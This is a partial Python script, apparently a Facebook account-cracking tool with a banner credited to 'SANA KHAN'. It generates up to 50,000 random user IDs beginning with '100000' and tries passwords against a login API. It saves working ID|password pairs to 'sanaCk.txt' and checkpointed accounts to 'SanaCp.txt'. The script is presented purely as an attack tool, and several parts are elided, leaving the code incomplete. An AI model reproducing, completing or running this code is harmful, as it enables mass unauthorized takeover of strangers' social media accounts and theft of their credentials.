...
class Main:
	def __init__(self):
     ...
     ##    ## ##     ## ##   ### ##     ## 
      ######  ##     ## ##    ## ##     ## 
\033[1;97m [*]=============================================")
\033[1;91m [\033[1;93m✯\033[1;91m] \033[1;97mFACEBOOK : SANA KHAN
...
\033[1;97m [*]=============================================")
    """)
		...
		print("\033[1;97m [*]=============================================")
		tanya = input("    \033[0;91m[\033[0;93mSANA\033[0;91m]\033[0;92m CHOOSE : ")
		if tanya in ["", " "]:
			Main()
		elif tanya in ["1", "01"]:
			        self.fbtua()
	...
	def fbtua(self):
		...
		xx = 999999999
		idx = "100000" 
		limit = int(input("    \033[0;91m[\033[0;93mSANA\033[0;91m]\033[0;92m TOTAL IDS TO CRACK (LIMIT 50000): "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;91m [\033[0;93mSANA\033[0;95m] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[🌹] [SANA] : %s/%s -> \033[0;92m [SANA-OK:%s]- \033[0;91m[SANA-CP:%s]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("sanaCk.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;97m   [SANA-CP] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("SanaCp.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue
